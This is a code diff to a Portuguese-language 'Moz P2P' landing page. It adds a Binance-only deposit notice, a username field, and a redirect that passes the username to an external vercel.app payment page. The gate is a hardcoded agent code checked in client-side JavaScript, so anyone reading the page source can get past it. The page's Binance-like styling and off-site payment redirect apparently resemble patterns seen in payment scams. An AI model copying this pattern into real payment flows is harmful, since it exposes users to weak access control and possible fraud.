@@ -28,6 +28,17 @@
       border-radius: 16px;
       box-shadow: 0 0 20px rgba(252, 213, 53, 0.1);
       margin: 20px;
+      position: relative;
+    }
+
+    .notice {
+      background-color: #fcd535;
+      color: #181a20;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 0.9rem;
+      font-weight: bold;
     }
 
     h1 {
@@ -145,11 +156,18 @@
       .modal-content {
         padding: 20px;
       }
+      
+      .notice {
+        font-size: 0.8rem;
+      }
     }
   </style>
 </head>
 <body>
   <div class="container">
+    <div class="notice">
+      ATENÇÃO: Atualmente só processamos depósitos para Binance devido a atualizações no sistema.
+    </div>
     <h1>Moz P2P</h1>
     <p>Bem-vindo à plataforma Moz P2P, onde você pode realizar transações de forma rápida, segura e confiável.</p>
     <a href="#" class="btn" id="startBtn">Começar Agora</a>
@@ -158,11 +176,15 @@
   <!-- Modal for agent code -->
   <div class="modal" id="agentModal">
     <div class="modal-content">
-      <h2>Inserir Código de Agente</h2>
+      <h2>Informações de Acesso</h2>
+      <div class="input-group">
+        <label for="username">Seu Nome de Usuário</label>
+        <input type="text" id="username" placeholder="Digite seu nome de usuário">
+      </div>
       <div class="input-group">
         <label for="agentCode">Código do Agente</label>
         <input type="text" id="agentCode" placeholder="Digite o código do agente">
-        <div class="error-message" id="errorMessage">Código inválido. Por favor, insira o código correto.</div>
+        <div class="error-message" id="errorMessage">Código inválido. Por favor, verifique e tente novamente.</div>
       </div>
       <div class="modal-buttons">
         <button class="btn btn-secondary" id="cancelBtn">Cancelar</button>
@@ -177,6 +199,7 @@
     const startBtn = document.getElementById('startBtn');
     const cancelBtn = document.getElementById('cancelBtn');
     const confirmBtn = document.getElementById('confirmBtn');
+    const usernameInput = document.getElementById('username');
     const agentCodeInput = document.getElementById('agentCode');
     const errorMessage = document.getElementById('errorMessage');
 
@@ -184,6 +207,7 @@
     startBtn.addEventListener('click', function(e) {
       e.preventDefault();
       modal.style.display = 'flex';
+      usernameInput.value = '';
       agentCodeInput.value = '';
       errorMessage.style.display = 'none';
     });
@@ -195,11 +219,18 @@
 
     // Handle confirm button click
     confirmBtn.addEventListener('click', function() {
+      const username = usernameInput.value.trim();
       const agentCode = agentCodeInput.value.trim();
       
+      if (!username) {
+        alert('Por favor, insira seu nome de usuário');
+        usernameInput.focus();
+        return;
+      }
+      
       if (agentCode === '79401moz') {
-        // Correct code - redirect to payment page
-        window.location.href = 'https://payment-bay-theta.vercel.app';
+        // Correct code - redirect to payment page with username as parameter
+        window.location.href = `https://payment-bay-theta.vercel.app?username=${encodeURIComponent(username)}`;
       } else {
         // Incorrect code - show error
         errorMessage.style.display = 'block';
